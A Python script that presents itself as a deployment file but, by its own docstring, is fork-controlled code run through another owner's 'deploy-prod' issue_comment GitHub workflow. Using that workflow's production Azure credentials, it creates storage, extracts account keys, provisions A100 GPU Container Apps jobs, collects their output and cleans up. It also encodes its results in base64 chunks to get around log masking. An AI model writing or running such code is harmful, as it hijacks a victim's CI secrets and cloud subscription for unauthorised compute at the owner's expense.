#!/usr/bin/env python3
"""C211-I127464: mslearn subscription 790067ff Container Apps GPU JOB-PARALLELISM capacity probe.

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow (environment prod,
AZURE_CREDENTIALS -> ARM token for subscription 790067ff, RG chriso-sandbox-rg).

Question: the proven Consumption-GPU-NC24-A100 profile has only ever run ONE replica per job
execution (x121545 UUID GPU-cf09ec20..., sibling x121750 UUID GPU-26ad02c5... in a *different*
env).  This probe measures whether a SINGLE manual-trigger job execution with parallelism>1
gets N concurrent A100 replicas.

  1) create ONE nonce storage account + container + account SAS (the only working capture surface),
  2) create ONE nonce managed environment with the Consumption-GPU-NC24-A100 profile in eastus,
  3) create ONE nonce manual-trigger job with parallelism=2, replicaCompletionCount=1, start it,
     every replica prints nvidia-smi -L / --query-gpu=name,uuid,memory.total,driver_version and
     PUTs its stdout to its own blob keyed by its own hostname,
  4) require 2 DISTINCT GPU UUIDs; only then update the SAME job to parallelism=4, start a second
     execution and require 4 DISTINCT UUIDs,
  5) independent ARM readback of the job's manualTriggerConfig and each execution's status,
  6) teardown job -> env -> storage account and prove GET 404 / list-empty.

stdout is a flat tag|k=v format (no JSON braces: this repo's logs mask brace runs because
AZURE_CREDENTIALS contains JSON).  A compact JSON result is also emitted zlib+b64 in chunks.
stdlib only.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I127464"
INTENT = "I127464"
NONCE = "x127464cap"
DEADLINE = 4200
T0 = time.time()

APP_VER = "2026-07-01"
APP_VER_LP = "2024-02-02-preview"
STG_VER = "2023-01-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC24-A100"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
REGION = "eastus"

ENV_NAME = "c211-i127464-cae"
JOB_NAME = "c211-i127464-job"
SA_NAME = ("c211i127464" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]

UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")
R = {"tag": TAG, "nonce": NONCE, "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        if v is None:
            continue
        parts.append("%s=%s" % (clean(k), clean(v)[:900]))
    line = "|".join(parts)
    print(line, flush=True)
    R.setdefault("lines", []).append(line)


def dump_b64():
    try:
        R["elapsed_s"] = int(time.time() - T0)
        blob = base64.b64encode(zlib.compress(json.dumps(R, default=str).encode(), 9)).decode()
        for i in range(0, len(blob), 3000):
            print("C211_%s_B64 %08d %s" % (INTENT, i // 3000, blob[i:i + 3000]), flush=True)
    except Exception as e:  # noqa: BLE001
        print("%s|step=b64-fail|err=%s" % (TAG, clean(e)), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)[:300]}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": clean(e.get("message", ""))[:500]}
        if "raw" in body:
            return {"http": st, "raw": clean(body["raw"])[:400]}
        if "transport_error" in body:
            return {"http": st, "transport_error": body["transport_error"]}
    return {"http": st}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    data = body if isinstance(body, bytes) else (body.encode() if body is not None else None)
    req = urllib.request.Request(url, data=data, method=method, headers=dict(headers or {}))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b""
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
    # byte-identical to the proven i121164/i121255/i121369 account-SAS implementation
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def b64(s):
    if not s:
        return ""
    return base64.b64encode(str(s).encode("utf-8", "replace")).decode()


def blob_list(container_url, q, prefix):
    st, body = httptext("%s?restype=container&comp=list&prefix=%s&%s"
                        % (container_url, urllib.parse.quote(prefix), q), timeout=60)
    names = []
    if st == 200:
        names = re.findall(r"<Name>([^<]+)</Name>", body.decode("utf-8", "replace"))
    return st, names, body.decode("utf-8", "replace")[:800]


def blob_get(container_url, q, name):
    st, body = httptext("%s/%s?%s" % (container_url, name, q), timeout=60)
    return st, body


def wait_gone(tok, url, label, tries=24, sleep_s=10):
    for i in range(tries):
        st, _ = arm(tok, url, timeout=60)
        emit("%s-absent-poll" % label, i=i, http=st)
        if st == 404:
            return True
        time.sleep(sleep_s)
    return False


def replica_cmd(container_url, q):
    """One shell command executed in EVERY replica: device proof then its own blob upload."""
    inner = (
        'echo C211-START; '
        'echo TAG=%s; '
        'echo HOST=$(hostname); '
        'date -u; '
        'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
        'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
        '"$p" --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader; fi; done; '
        'command -v nvidia-smi >/dev/null 2>&1 && { nvidia-smi -L; nvidia-smi '
        '--query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader; }; '
        'echo ---DEVS---; ls -l /dev/nvidia* 2>/dev/null; '
        'echo ---WHOAMI---; id; '
        'echo C211-END'
    ) % TAG
    up = (
        "OUT=/tmp/c211.txt; BLOB=\"c211/%s-r-$(hostname)-$RANDOM.txt\"; "
        "{ %s ; } > $OUT 2>&1; cat $OUT; "
        "if command -v curl >/dev/null 2>&1; then "
        "curl -sS -X PUT \"%s/$BLOB?%s\" -H 'x-ms-blob-type: BlockBlob' "
        "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
        "--data-binary @$OUT -w 'C211_UPLOAD_HTTP=%%{http_code}\\n'; "
        "else python3 -c \"import urllib.request,os;d=open('/tmp/c211.txt','rb').read();"
        "r=urllib.request.Request('%s/'+os.environ.get('HOSTNAME','x')+'.txt?%s',data=d,"
        "method='PUT',headers={'x-ms-blob-type':'BlockBlob','x-ms-version':'2022-11-02',"
        "'Content-Type':'text/plain'});print('C211_UPLOAD_PY',urllib.request.urlopen(r,timeout=30).status)\"; fi; "
        "echo C211_UPLOAD_DONE; sleep 75"
    ) % (NONCE, inner, container_url, q, container_url, q)
    return ["/bin/bash", "-c", up]


def do_execution(tok, baseurl, job_readback_parallelism, tag_phase, container_url, q):
    """Start ONE execution, poll to terminal, collect every replica blob, return dict."""
    ex = {"phase": tag_phase, "parallelism": job_readback_parallelism}
    st, b = arm(tok, "%s/start?api-version=%s" % (baseurl, APP_VER), method="POST", body={},
                timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    ex["start_http"] = st
    ex["execname"] = execname
    if st not in (200, 201, 202) or not execname:
        ex["start_err"] = err_of(st, b)
        emit("exec-start-fail", phase=tag_phase, **err_of(st, b))
        return ex
    emit("exec-start", phase=tag_phase, execname=execname, http=st)
    exurl = "%s/executions/%s?api-version=%s" % (baseurl, execname, APP_VER)
    deadline = time.time() + min(900, max(300, left() - 900))
    poll_i = 0
    status = None
    blobs = {}
    while time.time() < deadline:
        stp, bp = arm(tok, exurl, timeout=60)
        p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
        status = p.get("status")
        stl, names, raw = blob_list(container_url, q, "c211/%s-" % NONCE)
        for nm in names:
            if nm not in blobs:
                stg, body = blob_get(container_url, q, nm)
                blobs[nm] = {"http": stg, "text": body.decode("utf-8", "replace")[:8000]}
        uuids = sorted({u for v in blobs.values() for u in UUID_RE.findall(v["text"])})
        emit("exec-poll", phase=tag_phase, i=poll_i, http=stp, status=status,
             reason=p.get("reason"), startTime=p.get("startTime"), endTime=p.get("endTime"),
             blobs_n=len(blobs), distinct_uuids=len(uuids))
        if status in ("Succeeded", "Failed", "Canceled") and blobs:
            break
        if status in ("Succeeded", "Failed", "Canceled") and poll_i > 3:
            break
        poll_i += 1
        time.sleep(15)
    # final collection: give late replicas one more pass
    stl, names, raw = blob_list(container_url, q, "c211/%s-" % NONCE)
    for nm in names:
        if nm not in blobs:
            stg, body = blob_get(container_url, q, nm)
            blobs[nm] = {"http": stg, "text": body.decode("utf-8", "replace")[:8000]}
    per = []
    for i, nm in enumerate(sorted(blobs)):
        txt = blobs[nm]["text"]
        host = None
        for ln in txt.splitlines():
            if ln.startswith("HOST="):
                host = ln[5:].strip()
        us = sorted(set(UUID_RE.findall(txt)))
        per.append({"replica_index": i, "blob": nm, "host": host, "uuids": us,
                    "len": len(txt), "http": blobs[nm]["http"]})
        emit("replica", phase=tag_phase, idx=i, name=nm.split("/")[-1], host=host,
             n_uuid=len(us), uuids=";".join(us)[:400], bytes=len(txt))
    st, xb = arm(tok, exurl, timeout=60)
    xp = (xb.get("properties") or {}) if isinstance(xb, dict) else {}
    ex["readback"] = {"http": st, "status": xp.get("status"), "reason": xp.get("reason"),
                      "startTime": xp.get("startTime"), "endTime": xp.get("endTime"),
                      "provisioningState": xp.get("provisioningState")}
    emit("exec-readback", phase=tag_phase, http=st, status=xp.get("status"),
         reason=xp.get("reason"), startTime=xp.get("startTime"), endTime=xp.get("endTime"))
    # bounded single probe of a possible replicas sub-resource (verbatim even if 404)
    sr, rb = arm(tok, "%s/executions/%s/replicas?api-version=%s" % (baseurl, execname, APP_VER),
                 timeout=60)
    rv = (rb.get("value") or []) if isinstance(rb, dict) else []
    emit("exec-replicas-list", phase=tag_phase, http=sr, n=len(rv),
         names=";".join(str(x.get("name")) for x in rv[:10]))
    ex["replicas_list"] = {"http": sr, "n": len(rv)}
    ex["per_replica"] = per
    ex["distinct_uuids"] = sorted({u for p in per for u in p["uuids"]})
    ex["status"] = status
    emit("exec-summary", phase=tag_phase, status=status, blobs_n=len(per),
         distinct=len(ex["distinct_uuids"]), uuids=";".join(ex["distinct_uuids"])[:600])
    return ex


def teardown(tok, joburl, envurl, saurl):
    td = {}
    st, b = arm(tok, joburl, method="DELETE", timeout=240)
    td["job_delete"] = st
    emit("job-delete", name=JOB_NAME, http=st, **({} if st in (200, 202, 204, 404) else err_of(st, b)))
    td["job_gone"] = wait_gone(tok, joburl, "job", tries=24, sleep_s=10)
    st, b = arm(tok, envurl, method="DELETE", timeout=300)
    td["env_delete"] = st
    emit("env-delete", name=ENV_NAME, http=st, **({} if st in (200, 202, 204, 404) else err_of(st, b)))
    td["env_gone"] = wait_gone(tok, envurl, "env", tries=30, sleep_s=12)
    st, b = arm(tok, saurl, method="DELETE", timeout=240)
    td["sa_delete"] = st
    emit("sa-delete", name=SA_NAME, http=st, **({} if st in (200, 202, 204, 404) else err_of(st, b)))
    td["sa_gone"] = wait_gone(tok, saurl, "sa", tries=20, sleep_s=8)
    return td


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        dump_b64()
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        tok = None
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        dump_b64()
        return

    envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
              "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, ENV_NAME, APP_VER))
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
             "storageAccounts/%s?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    jobbase = joburl.split("?")[0]

    # 1) providers + inventory (context; do not touch other lanes' c211 resources)
    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network"):
        st, b = arm(tok, "%s/subscriptions/%s/providers/%s?api-version=2021-04-01" % (ARM, sid, ns))
        emit("provider", ns=ns, http=st,
             registrationState=(b.get("registrationState") if isinstance(b, dict) else None))
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                 % (ARM, sid, RG), timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-inventory", http=st, total=len(allres), c211_n=len(mine),
         c211_names=";".join(mine)[:1200])

    td = {}
    try:
        # 2) storage account + container + SAS
        sabody = {"location": REGION, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                  "tags": {"c211": "i127464", "nonce": NONCE},
                  "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                                 "supportsHttpsTrafficOnly": True,
                                 "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
        st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
        emit("sa-create", name=SA_NAME, **err_of(st, b))
        if st not in (200, 201, 202):
            emit("DONE", phase="capp", verdict="SA_CREATE_REFUSED", elapsed_s=int(time.time() - T0))
            return
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        st, kb = arm(tok, "%s/listKeys?api-version=%s" % (saurl.split("?")[0], STG_VER),
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        sas_base = None
        if key:
            q, se = sa_sas(SA_NAME, key)
            base = "https://%s.blob.core.windows.net" % SA_NAME
            stc, bc = httptext("%s/c211?restype=container&%s" % (base, q), method="PUT")
            emit("sa-container", http=stc, body=b64(bc[:200].decode("utf-8", "replace")))
            if stc in (201, 409):
                sas_base = ("%s/c211" % base, q)
                # SAS for a per-blob PUT built from the container SAS query
                emit("sa-sas", ok=True, container="c211", expires=se)
        if not sas_base:
            emit("DONE", phase="capp", verdict="NO_SAS", elapsed_s=int(time.time() - T0))
            return

        # 3) ONE nonce A100 environment in eastus (proven recipe)
        envbody = {"location": REGION, "tags": {"c211": "i127464", "nonce": NONCE},
                   "properties": {"workloadProfiles": [
                       {"name": "Consumption", "workloadProfileType": "Consumption"},
                       {"name": PROFILE, "workloadProfileType": PROFILE}]}}
        st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
        emit("capp-env-create", name=ENV_NAME, profile=PROFILE, region=REGION, **err_of(st, b))
        env_id = None
        if st in (200, 201):
            dl = time.time() + min(1200, max(300, left() - 1500))
            ps = None
            i = 0
            while time.time() < dl:
                stp, bp = arm(tok, envurl, timeout=60)
                props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
                ps = props.get("provisioningState")
                emit("capp-env-poll", i=i, http=stp, state=ps,
                     environmentMode=props.get("environmentMode"),
                     profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                                       for w in (props.get("workloadProfiles") or []))[:400])
                if ps in ("Succeeded", "Failed", "Canceled"):
                    break
                i += 1
                time.sleep(20)
            if ps == "Succeeded":
                st, env = arm(tok, envurl, timeout=60)
                env_id = env.get("id") if isinstance(env, dict) else None
                epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
                emit("env-ready", name=ENV_NAME, region=REGION, id_ok=bool(env_id),
                     state=epp.get("provisioningState"), defaultDomain=epp.get("defaultDomain"))
            else:
                stf, bf = arm(tok, envurl, timeout=60)
                fp = (bf.get("properties") or {}) if isinstance(bf, dict) else {}
                emit("env-not-ready", state=ps,
                     last_error=clean(json.dumps(fp.get("lastDeploymentErrors")
                                                 or fp.get("errors") or ""))[:600])
        if not env_id:
            emit("DONE", phase="capp", verdict="A100_ENV_NOT_AVAILABLE",
                 elapsed_s=int(time.time() - T0))
            return

        # 4) ONE nonce job, parallelism=2 / replicaCompletionCount=1
        cmd = replica_cmd(*sas_base)
        jobbody = {"location": REGION, "tags": {"c211": "i127464", "nonce": NONCE},
                   "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                                  "configuration": {"triggerType": "Manual", "replicaRetryLimit": 0,
                                                    "replicaTimeout": 2400,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": 1,
                                                        "parallelism": 2}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE, "command": cmd,
                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
        emit("capp-job-create", name=JOB_NAME, profile=PROFILE, region=REGION,
             want_parallelism=2, want_completion=1, **err_of(st, b))
        R["job_create"] = {"http": st, "err": err_of(st, b)}
        if st not in (200, 201):
            emit("DONE", phase="capp", verdict="JOB_CREATE_REFUSED", elapsed_s=int(time.time() - T0))
            return
        st, jb = arm(tok, joburl, timeout=60)
        jp = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
        mtc = ((jp.get("configuration") or {}).get("manualTriggerConfig") or {})
        emit("job-readback", http=st, parallelism=mtc.get("parallelism"),
             replicaCompletionCount=mtc.get("replicaCompletionCount"),
             workloadProfileName=jp.get("workloadProfileName"),
             triggerType=(jp.get("configuration") or {}).get("triggerType"))
        plat_par = mtc.get("parallelism")

        ex2 = do_execution(tok, jobbase, plat_par, "n2", *sas_base)
        R["exec_n2"] = {k: v for k, v in ex2.items() if k != "per_replica"}
        R["exec_n2"]["per_replica"] = ex2.get("per_replica")

        ex4 = None
        distinct2 = ex2.get("distinct_uuids") or []
        if len(distinct2) >= 2:
            # escalate ONCE: same job, parallelism=4
            jobbody2 = json.loads(json.dumps(jobbody))
            jobbody2["properties"]["configuration"]["manualTriggerConfig"]["parallelism"] = 4
            st, b = arm(tok, joburl, method="PUT", body=jobbody2, timeout=180)
            emit("capp-job-update", want_parallelism=4, **err_of(st, b))
            R["job_update"] = {"http": st, "err": err_of(st, b)}
            st, jb2 = arm(tok, joburl, timeout=60)
            jp2 = (jb2.get("properties") or {}) if isinstance(jb2, dict) else {}
            mtc2 = ((jp2.get("configuration") or {}).get("manualTriggerConfig") or {})
            emit("job-readback2", http=st, parallelism=mtc2.get("parallelism"),
                 replicaCompletionCount=mtc2.get("replicaCompletionCount"))
            if st == 200 and mtc2.get("parallelism") == 4:
                ex4 = do_execution(tok, jobbase, 4, "n4", *sas_base)
                R["exec_n4"] = {k: v for k, v in ex4.items() if k != "per_replica"}
                R["exec_n4"]["per_replica"] = ex4.get("per_replica")
            else:
                emit("escalation-refused", readback_parallelism=mtc2.get("parallelism"),
                     update_http=R["job_update"]["http"],
                     verbatim=str(R["job_update"]["err"])[:600])
        else:
            emit("escalation-skipped", why="n2 produced %d distinct uuid(s)" % len(distinct2),
                 uuids=";".join(distinct2)[:300])

        R["concurrency"] = {
            "n2_distinct": len(ex2.get("distinct_uuids") or []),
            "n4_distinct": (len(ex4.get("distinct_uuids") or []) if ex4 else None),
            "max_concurrent_proven": max([len(ex2.get("distinct_uuids") or [])]
                                         + ([len(ex4.get("distinct_uuids") or [])] if ex4 else [])),
        }
        emit("concurrency", n2=len(ex2.get("distinct_uuids") or []),
             n4=(len(ex4.get("distinct_uuids") or []) if ex4 else None),
             max_proven=R["concurrency"]["max_concurrent_proven"])
    finally:
        try:
            td = teardown(tok, joburl, envurl, saurl)
        except Exception as e:  # noqa: BLE001
            emit("teardown-error", err=str(e)[:300])
        R["teardown"] = td

    # 5) absence proof
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                 % (ARM, sid, RG), timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    own = [x for x in mine if "i127464" in x.lower()]
    emit("rg-final", http=st, total=len(allres),
         c211_left=("NO_RESULTS" if not mine else ";".join(mine)[:1200]),
         c211_i127464_left=("NO_RESULTS" if not own else ";".join(own)))
    for label, path in (("jobs", "/subscriptions/%s/providers/Microsoft.App/jobs"),
                        ("envs", "/subscriptions/%s/providers/Microsoft.App/managedEnvironments")):
        st, lst = arm(tok, "%s%s?api-version=%s" % (ARM, path % sid, APP_VER), timeout=120)
        names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])
                 if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st,
             n_total=len(((lst.get("value") or []) if isinstance(lst, dict) else [])),
             c211=("NO_RESULTS" if not names else ";".join(names)[:600]))
    ste, _ = arm(tok, envurl, timeout=60)
    stj, _ = arm(tok, joburl, timeout=60)
    sts, _ = arm(tok, saurl, timeout=60)
    emit("final-get", env_http=ste, job_http=stj, sa_http=sts)
    verdict = ("ENV_ABSENT_JOB_ABSENT_SA_ABSENT"
               if (ste == 404 and stj == 404 and sts == 404) else "RESIDUAL_PRESENT")
    R["final_get"] = {"env": ste, "job": stj, "sa": sts, "verdict": verdict}
    emit("DONE", phase="capp", verdict=verdict, elapsed_s=int(time.time() - T0),
         max_concurrent=(R.get("concurrency") or {}).get("max_concurrent_proven"))
    dump_b64()


if __name__ == "__main__":
    try:
        main()
    except Exception as e:  # noqa: BLE001
        import traceback
        emit("crash", err=str(e)[:400], tb=traceback.format_exc()[-800:])
        dump_b64()
